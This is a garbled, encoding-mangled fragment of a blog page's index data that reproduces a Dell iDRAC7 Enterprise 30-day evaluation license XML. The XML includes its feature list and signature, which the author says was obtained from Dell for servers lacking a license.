lns:ID=\u0026#34;28\u0026#34; lns:Description=\u0026#34;Console Collaboration\u0026#34; lns:Enabled=\u0026#34;true\u0026#34;/\u0026gt; \u0026lt;lns:Feature lns:ID=\u0026#34;29\u0026#34; lns:Description=\u0026#34;Device Monitoring\u0026#34; lns:Enabled=\u0026#34;true\u0026#34;/\u0026gt; \u0026lt;lns:Feature lns:ID=\u0026#34;30\u0026#34; lns:Description=\u0026#34;Remote Inventory\u0026#34; lns:Enabled=\u0026#34;true\u0026#34;/\u0026gt; \u0026lt;lns:Feature lns:ID=\u0026#34;31\u0026#34; lns:Description=\u0026#34;Storage Monitoring\u0026#34; lns:Enabled=\u0026#34;true\u0026#34;/\u0026gt; \u0026lt;lns:Feature lns:ID=\u0026#34;32\u0026#34; lns:Description=\u0026#34;Remote Firmware Update\u0026#34; lns:Enabled=\u0026#34;true\u0026#34;/\u0026gt; \u0026lt;lns:Feature lns:ID=\u0026#34;33\u0026#34; lns:Description=\u0026#34;Remote Firmware Configuration\u0026#34; lns:Enabled=\u0026#34;true\u0026#34;/\u0026gt; \u0026lt;lns:Feature lns:ID=\u0026#34;34\u0026#34; lns:Description=\u0026#34;Remote Inventory Export\u0026#34; lns:Enabled=\u0026#34;true\u0026#34;/\u0026gt; \u0026lt;lns:Feature lns:ID=\u0026#34;35\u0026#34; lns:Description=\u0026#34;Remote Operating System Deployment\u0026#34; lns:Enabled=\u0026#34;true\u0026#34;/\u0026gt; \u0026lt;lns:Feature lns:ID=\u0026#34;36\u0026#34; lns:Description=\u0026#34;Backup and Restore\u0026#34; lns:Enabled=\u0026#34;true\u0026#34;/\u0026gt; \u0026lt;lns:Feature lns:ID=\u0026#34;37\u0026#34; lns:Description=\u0026#34;Part Replacement\u0026#34; lns:Enabled=\u0026#34;true\u0026#34;/\u0026gt; \u0026lt;lns:Feature lns:ID=\u0026#34;38\u0026#34; lns:Description=\u0026#34;SSH\u0026#34; lns:Enabled=\u0026#34;true\u0026#34;/\u0026gt; \u0026lt;lns:Feature lns:ID=\u0026#34;39\u0026#34; lns:Description=\u0026#34;Remote File Share\u0026#34; lns:Enabled=\u0026#34;true\u0026#34;/\u0026gt; \u0026lt;lns:Feature lns:ID=\u0026#34;40\u0026#34; lns:Description=\u0026#34;Virtual Folders\u0026#34; lns:Enabled=\u0026#34;true\u0026#34;/\u0026gt; \u0026lt;lns:Feature lns:ID=\u0026#34;41\u0026#34; lns:Description=\u0026#34;Web GUI\u0026#34; lns:Enabled=\u0026#34;true\u0026#34;/\u0026gt; \u0026lt;lns:Feature lns:ID=\u0026#34;42\u0026#34; lns:Description=\u0026#34;Network Time Protocol\u0026#34; lns:Enabled=\u0026#34;true\u0026#34;/\u0026gt; \u0026lt;lns:Feature lns:ID=\u0026#34;43\u0026#34; lns:Description=\u0026#34;Email Alerts\u0026#34; lns:Enabled=\u0026#34;true\u0026#34;/\u0026gt; \u0026lt;lns:Feature lns:ID=\u0026#34;44\u0026#34; lns:Description=\u0026#34;Security Lockout\u0026#34; lns:Enabled=\u0026#34;true\u0026#34;/\u0026gt; \u0026lt;lns:Feature lns:ID=\u0026#34;45\u0026#34; lns:Description=\u0026#34;Remote Syslog\u0026#34; lns:Enabled=\u0026#34;true\u0026#34;/\u0026gt; \u0026lt;lns:Feature lns:ID=\u0026#34;253\u0026#34; lns:Description=\u0026#34;Integrated Dell Remote Access Controller 7 Enterprise\u0026#34; lns:Enabled=\u0026#34;true\u0026#34;/\u0026gt; \u0026lt;/lns:LicenseData\u0026gt; \u0026lt;dsig:Signature xmlns:dsig=\u0026#34;http://www.w3.org/2000/09/xmldsig#\u0026#34;\u0026gt; \u0026lt;dsig:SignedInfo\u0026gt; \u0026lt;dsig:CanonicalizationMethod Algorithm=\u0026#34;http://www.w3.org/2001/10/xml-exc-c14n#\u0026#34;/\u0026gt; \u0026lt;dsig:SignatureMethod Algorithm=\u0026#34;http://www.w3.org/2000/09/xmldsig#rsa-sha1\u0026#34;/\u0026gt; \u0026lt;dsig:Reference URI=\u0026#34;\u0026#34;\u0026gt; \u0026lt;dsig:Transforms\u0026gt; \u0026lt;dsig:Transform Algorithm=\u0026#34;http://www.w3.org/2000/09/xmldsig#enveloped-signature\u0026#34;/\u0026gt; \u0026lt;/dsig:Transforms\u0026gt; \u0026lt;dsig:DigestMethod Algorithm=\u0026#34;http://www.w3.org/2000/09/xmldsig#sha1\u0026#34;/\u0026gt; \u0026lt;dsig:DigestValue\u0026gt;DrtnjP0vUsyT+18jazjmiaGrvc0=\u0026lt;/dsig:DigestValue\u0026gt; \u0026lt;/dsig:Reference\u0026gt; \u0026lt;/dsig:SignedInfo\u0026gt; \u0026lt;dsig:SignatureValue\u0026gt;Qg4Omx1ZGrVllUPbg/X25aJxK5qlNCF/G04NLwXhbmpqoplSRkCCUgb+6TvVz9b3 Ut7sSa/WjA0mv+mbcqIENTAnpveIkIOQPR3mdjCBwX2cLYieV9nOIGobxqHU7o97 QjbSAkmTHcRo0PI6mP8tc7Od4WNWMZ48rrUBeOrVOr1EZeptPUbeaSofy4nvlzbC pcpzZLbjAITT157r9KiFe9joG2hCEClrQPO0ScXHgKXrAWrQE9wX7e2De4uCvJwI hGWpJzDQNJJZbsWhDoZJn/59G/KRjzxIHIzIpUt1XPPIGHl5yMXDaRFcIMES0RuJ SWZS8tt9E001Fr/8/jQNgA==\u0026lt;/dsig:SignatureValue\u0026gt; \u0026lt;dsig:KeyInfo\u0026gt; \u0026lt;dsig:X509Data\u0026gt; \u0026lt;dsig:X509Certificate\u0026gt;MIIDTjCCAjagAwIBAgIBATANBgkqhkiG9w0BAQUFADBRMRMwEQYDVQQKEwpEZWxs LCBJbmMuMSEwHwYDVQQLExhFbWJlZGRlZCBMaWNlbnNlIE1hbmFnZXIxFzAVBgNV BAMTDkNBIENlcnRpZmljYXRlMB4XDTEwMDEwMTAwMDAwMFoXDTM1MTIzMTIzNTk1 OVowVjETMBEGA1UEChMKRGVsbCwgSW5jLjEhMB8GA1UECxMYRW1iZWRkZWQgTGlj ZW5zZSBNYW5hZ2VyMRwwGgYDVQQDExNTaWduaW5nIENlcnRpZmljYXRlMIIBIjAN BgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAqbRo2DZtkjxl5YtqD5ePYdzrWbkU YQJwVaWYe1tE7ZAdou5TLTsjPnaa1cLcPTexn+cq8YjukIVwkwJP7yJ5GkrYGUnf 0Q6unWWgwcgTStlpflz31e8AbxXqNYZEFvEktojYS0kAfiYES+H02GUU5PtV7B9Y BbtZEowU2DPuqRGG1FF8mAsp1vojcbQGx+nS2Of47oQJRrJlh28COXyf2w/+IRAz RmeYin+9pisfrT9fmlUtxa7sAAV/KZFRx8ED31YiktXgI/u/PNnHlchiCMaL6pzA HMBf115O7A2y6IZ9sXUHvH8V9QnDkWT1XHMn8GCW8HXOA5zA232OxiaRmQIDAQAB oywwKjAJBgNVHRMEAjAAMB0GA1UdDgQWBBQAoZ7yMjDHMAFtmmmO/zyz3BJ6hjAN BgkqhkiG9w0BAQUFAAOCAQEAHHgoOg57S+lAEejahdBE1HMwe6BF3b9bzUMCynn9 7buXa3cnRFO3H3674WKU6nBjv4nkT3qMyXwgi7MvXcu69msK4eM6QA8XeC7G1rD+ 2bb/ENR9R9Zo0BWLym/ij8uUA/BzX8hnbzWxN82+FMdY9WD4fJAJwJ5ZPEbU1Vfy 7wOWosHgDPXjeAhlhkxDQi6vlRTJdfED6tBY7iGD4AQXfzrHzAZpZlIvKbM2c54B 65wMSlqfEWMBDhT5qcwGCq82hmi7/sCtu9Z20g2s9F0fp4XlGX8L7l0hCa46zjay 37GffYsScEDFg/DmkIpcXnGzyx8l1msLzpj8Gt4zHhPlgA==\u0026lt;/dsig:X509Certificate\u0026gt; \u0026lt;/dsig:X509Data\u0026gt; \u0026lt;/dsig:KeyInfo\u0026gt; \u0026lt;/dsig:Signature\u0026gt;\u0026lt;/lns:LicenseClass\u0026gt; æ–‡ä»¶ä¸‹è½½ï¼šiDRAC7_Ent_Trial.xml\n","permalink":"https://rendoumi.com/posts/20230406-dell_idrac/","summary":"\u003cp\u003eæ–°å…¬å¸çš„dellæœåŠ¡å™¨idracå±…ç„¶æ²¡æœ‰licenseï¼Œæ— æ³•è¿œç¨‹ï¼Œæ‰¾äº†dellè¦äº†ä¸€ä¸ªä¸´æ—¶licenseç»™è£…ä¸Šï¼Œå…¶å®è£…å¥½ç³»ç»Ÿå°±ä¸ä¼šå¤ªç”¨åˆ°äº†ï¼Œè®°å½•ä¸€ä¸‹ï¼Œä»¥åå¤‡ç”¨ã€‚\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-xml\" data-lang=\"xml\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"cp\"\u003e\u0026lt;?xml version=\u0026#34;1.0\u0026#34;?\u0026gt;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c\"\u003e\u0026lt;!--Copyright (c) 2010-2011 Dell Inc. All Rights Reserved.--\u0026gt;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nt\"\u003e\u0026lt;lns:LicenseClass\u003c/span\u003e \u003cspan class=\"na\"\u003exmlns:ds=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;http://www.w3.org/2000/09/xmldsig#\u0026#34;\u003c/span\u003e \u003cspan class=\"na\"\u003exmlns:xsi=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;http://www.w3.org/2001/XMLSchema-instance\u0026#34;\u003c/span\u003e \u003cspan class=\"na\"\u003exmlns:lns=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;http://www.dell.com/2011/12G/licensing\u0026#34;\u003c/span\u003e\u003cspan class=\"nt\"\u003e\u0026gt;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  \u003cspan class=\"nt\"\u003e\u0026lt;lns:LicenseData\u0026gt;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"nt\"\u003e\u0026lt;lns:Schema\u003c/span\u003e \u003cspan class=\"na\"\u003elns:Vendor=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;Dell\u0026#34;\u003c/span\u003e \u003cspan class=\"na\"\u003elns:ID=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;iDRAC\u0026#34;\u003c/span\u003e \u003cspan class=\"na\"\u003elns:maxDepth=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;255\u0026#34;\u003c/span\u003e \u003cspan class=\"na\"\u003elns:SchemaVersion=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;2.0\u0026#34;\u003c/span\u003e\u003cspan class=\"nt\"\u003e/\u0026gt;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"nt\"\u003e\u0026lt;lns:TransferableLicense\u0026gt;\u003c/span\u003efalse\u003cspan class=\"nt\"\u003e\u0026lt;/lns:TransferableLicense\u0026gt;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"nt\"\u003e\u0026lt;lns:UTCdateSold\u0026gt;\u003c/span\u003e2011-09-20T16:10:37Z\u003cspan class=\"nt\"\u003e\u0026lt;/lns:UTCdateSold\u0026gt;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"nt\"\u003e\u0026lt;lns:EntitlementID\u0026gt;\u003c/span\u003e56r8irR7fV5w3MIxlJUFL9Ph_Lori_Matthews\u003cspan class=\"nt\"\u003e\u0026lt;/lns:EntitlementID\u0026gt;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"nt\"\u003e\u0026lt;lns:DeviceClass\u003c/span\u003e \u003cspan class=\"na\"\u003elns:ID=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;iDRAC\u0026#34;\u003c/span\u003e\u003cspan class=\"nt\"\u003e/\u0026gt;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"nt\"\u003e\u0026lt;lns:ProductDescription\u0026gt;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      \u003cspan class=\"nt\"\u003e\u0026lt;lns:lang_en\u0026gt;\u003c/span\u003eiDRAC7 Enterprise Evaluation License\u003cspan class=\"nt\"\u003e\u0026lt;/lns:lang_en\u0026gt;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      \u003cspan class=\"nt\"\u003e\u0026lt;lns:lang_es\u0026gt;\u003c/span\u003eiDRAC7 Enterprise Evaluation License\u003cspan class=\"nt\"\u003e\u0026lt;/lns:lang_es\u0026gt;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      \u003cspan class=\"nt\"\u003e\u0026lt;lns:lang_fr\u0026gt;\u003c/span\u003eiDRAC7 Enterprise Evaluation License\u003cspan class=\"nt\"\u003e\u0026lt;/lns:lang_fr\u0026gt;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      \u003cspan class=\"nt\"\u003e\u0026lt;lns:lang_de\u0026gt;\u003c/span\u003eiDRAC7 Enterprise Evaluation License\u003cspan class=\"nt\"\u003e\u0026lt;/lns:lang_de\u0026gt;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      \u003cspan class=\"nt\"\u003e\u0026lt;lns:lang_it\u0026gt;\u003c/span\u003eiDRAC7 Enterprise Evaluation License\u003cspan class=\"nt\"\u003e\u0026lt;/lns:lang_it\u0026gt;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      \u003cspan class=\"nt\"\u003e\u0026lt;lns:lang_ja\u0026gt;\u003c/span\u003eiDRAC7 Enterprise Evaluation License\u003cspan class=\"nt\"\u003e\u0026lt;/lns:lang_ja\u0026gt;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      \u003cspan class=\"nt\"\u003e\u0026lt;lns:lang_zh\u0026gt;\u003c/span\u003eiDRAC7 Enterprise Evaluation License\u003cspan class=\"nt\"\u003e\u0026lt;/lns:lang_zh\u0026gt;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"nt\"\u003e\u0026lt;/lns:ProductDescription\u0026gt;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"nt\"\u003e\u0026lt;lns:LicenseTerm\u0026gt;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      \u003cspan class=\"nt\"\u003e\u0026lt;lns:Evaluation\u003c/span\u003e \u003cspan class=\"na\"\u003elns:Duration=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;P30D\u0026#34;\u003c/span\u003e\u003cspan class=\"nt\"\u003e/\u0026gt;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"nt\"\u003e\u0026lt;/lns:LicenseTerm\u0026gt;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"nt\"\u003e\u0026lt;lns:DeviceInfo\u003c/span\u003e \u003cspan class=\"na\"\u003elns:ID=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;1\u0026#34;\u003c/span\u003e \u003cspan class=\"na\"\u003elns:VendorID=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;0x1912\u0026#34;\u003c/span\u003e \u003cspan class=\"na\"\u003elns:DeviceID=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;0x0011\u0026#34;\u003c/span\u003e\u003cspan class=\"nt\"\u003e/\u0026gt;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"nt\"\u003e\u0026lt;lns:Feature\u003c/span\u003e \u003cspan class=\"na\"\u003elns:ID=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;1\u0026#34;\u003c/span\u003e \u003cspan class=\"na\"\u003elns:Description=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;License Management\u0026#34;\u003c/span\u003e \u003cspan class=\"na\"\u003elns:Enabled=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;true\u0026#34;\u003c/span\u003e\u003cspan class=\"nt\"\u003e/\u0026gt;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"nt\"\u003e\u0026lt;lns:Feature\u003c/span\u003e \u003cspan class=\"na\"\u003elns:ID=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;2\u0026#34;\u003c/span\u003e \u003cspan class=\"na\"\u003elns:Description=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;RACADM\u0026#34;\u003c/span\u003e \u003cspan class=\"na\"\u003elns:Enabled=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;true\u0026#34;\u003c/span\u003e\u003cspan class=\"nt\"\u003e/\u0026gt;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"nt\"\u003e\u0026lt;lns:Feature\u003c/span\u003e \u003cspan class=\"na\"\u003elns:ID=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;3\u0026#34;\u003c/span\u003e \u003cspan class=\"na\"\u003elns:Description=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;WSMAN\u0026#34;\u003c/span\u003e \u003cspan class=\"na\"\u003elns:Enabled=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;true\u0026#34;\u003c/span\u003e\u003cspan class=\"nt\"\u003e/\u0026gt;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"nt\"\u003e\u0026lt;lns:Feature\u003c/span\u003e \u003cspan class=\"na\"\u003elns:ID=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;4\u0026#34;\u003c/span\u003e \u003cspan class=\"na\"\u003elns:Description=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;SNMP\u0026#34;\u003c/span\u003e \u003cspan class=\"na\"\u003elns:Enabled=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;true\u0026#34;\u003c/span\u003e\u003cspan class=\"nt\"\u003e/\u0026gt;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"nt\"\u003e\u0026lt;lns:Feature\u003c/span\u003e \u003cspan class=\"na\"\u003elns:ID=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;5\u0026#34;\u003c/span\u003e \u003cspan class=\"na\"\u003elns:Description=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;Auto Discovery\u0026#34;\u003c/span\u003e \u003cspan class=\"na\"\u003elns:Enabled=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;true\u0026#34;\u003c/span\u003e\u003cspan class=\"nt\"\u003e/\u0026gt;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"nt\"\u003e\u0026lt;lns:Feature\u003c/span\u003e \u003cspan class=\"na\"\u003elns:ID=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;6\u0026#34;\u003c/span\u003e \u003cspan class=\"na\"\u003elns:Description=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;USC Firmware Update\u0026#34;\u003c/span\u003e \u003cspan class=\"na\"\u003elns:Enabled=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;true\u0026#34;\u003c/span\u003e\u003cspan class=\"nt\"\u003e/\u0026gt;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"nt\"\u003e\u0026lt;lns:Feature\u003c/span\u003e \u003cspan class=\"na\"\u003elns:ID=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;7\u0026#34;\u003c/span\u003e \u003cspan class=\"na\"\u003elns:Description=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;Update Package\u0026#34;\u003c/span\u003e \u003cspan class=\"na\"\u003elns:Enabled=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;true\u0026#34;\u003c/span\u003e\u003cspan class=\"nt\"\u003e/\u0026gt;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"nt\"\u003e\u0026lt;lns:Feature\u003c/span\u003e \u003cspan class=\"na\"\u003elns:ID=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;8\u0026#34;\u003c/span\u003e \u003cspan class=\"na\"\u003elns:Description=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;USC Operating System Deployment\u0026#34;\u003c/span\u003e \u003cspan class=\"na\"\u003elns:Enabled=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;true\u0026#34;\u003c/span\u003e\u003cspan class=\"nt\"\u003e/\u0026gt;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"nt\"\u003e\u0026lt;lns:Feature\u003c/span\u003e \u003cspan class=\"na\"\u003elns:ID=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;9\u0026#34;\u003c/span\u003e \u003cspan class=\"na\"\u003elns:Description=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;USC Device Configuration\u0026#34;\u003c/span\u003e \u003cspan class=\"na\"\u003elns:Enabled=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;true\u0026#34;\u003c/span\u003e\u003cspan class=\"nt\"\u003e/\u0026gt;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"nt\"\u003e\u0026lt;lns:Feature\u003c/span\u003e \u003cspan class=\"na\"\u003elns:ID=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;10\u0026#34;\u003c/span\u003e \u003cspan class=\"na\"\u003elns:Description=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;USC Diagnostics\u0026#34;\u003c/span\u003e \u003cspan class=\"na\"\u003elns:Enabled=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;true\u0026#34;\u003c/span\u003e\u003cspan class=\"nt\"\u003e/\u0026gt;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"nt\"\u003e\u0026lt;lns:Feature\u003c/span\u003e \u003cspan class=\"na\"\u003elns:ID=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;11\u0026#34;\u003c/span\u003e \u003cspan class=\"na\"\u003elns:Description=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;Power Budget\u0026#34;\u003c/span\u003e \u003cspan class=\"na\"\u003elns:Enabled=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;true\u0026#34;\u003c/span\u003e\u003cspan class=\"nt\"\u003e/\u0026gt;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"nt\"\u003e\u0026lt;lns:Feature\u003c/span\u003e \u003cspan class=\"na\"\u003elns:ID=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;12\u0026#34;\u003c/span\u003e \u003cspan class=\"na\"\u003elns:Description=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;Power Monitoring\u0026#34;\u003c/span\u003e \u003cspan class=\"na\"\u003elns:Enabled=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;true\u0026#34;\u003c/span\u003e\u003cspan class=\"nt\"\u003e/\u0026gt;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"nt\"\u003e\u0026lt;lns:Feature\u003c/span\u003e \u003cspan class=\"na\"\u003elns:ID=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;13\u0026#34;\u003c/span\u003e \u003cspan class=\"na\"\u003elns:Description=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;Virtual Media\u0026#34;\u003c/span\u003e \u003cspan class=\"na\"\u003elns:Enabled=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;true\u0026#34;\u003c/span\u003e\u003cspan class=\"nt\"\u003e/\u0026gt;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"nt\"\u003e\u0026lt;lns:Feature\u003c/span\u003e \u003cspan class=\"na\"\u003elns:ID=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;14\u0026#34;\u003c/span\u003e \u003cspan class=\"na\"\u003elns:Description=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;Telnet\u0026#34;\u003c/span\u003e \u003cspan class=\"na\"\u003elns:Enabled=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;true\u0026#34;\u003c/span\u003e\u003cspan class=\"nt\"\u003e/\u0026gt;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"nt\"\u003e\u0026lt;lns:Feature\u003c/span\u003e \u003cspan class=\"na\"\u003elns:ID=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;15\u0026#34;\u003c/span\u003e \u003cspan class=\"na\"\u003elns:Description=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;SMASH CLP\u0026#34;\u003c/span\u003e \u003cspan class=\"na\"\u003elns:Enabled=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;true\u0026#34;\u003c/span\u003e\u003cspan class=\"nt\"\u003e/\u0026gt;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"nt\"\u003e\u0026lt;lns:Feature\u003c/span\u003e \u003cspan class=\"na\"\u003elns:ID=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;16\u0026#34;\u003c/span\u003e \u003cspan class=\"na\"\u003elns:Description=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;IPv6\u0026#34;\u003c/span\u003e \u003cspan class=\"na\"\u003elns:Enabled=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;true\u0026#34;\u003c/span\u003e\u003cspan class=\"nt\"\u003e/\u0026gt;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"nt\"\u003e\u0026lt;lns:Feature\u003c/span\u003e \u003cspan class=\"na\"\u003elns:ID=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;17\u0026#34;\u003c/span\u003e \u003cspan class=\"na\"\u003elns:Description=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;Dynamic DNS\u0026#34;\u003c/span\u003e \u003cspan class=\"na\"\u003elns:Enabled=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;true\u0026#34;\u003c/span\u003e\u003cspan class=\"nt\"\u003e/\u0026gt;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"nt\"\u003e\u0026lt;lns:Feature\u003c/span\u003e \u003cspan class=\"na\"\u003elns:ID=\u003c/span\u003e\u003cspan 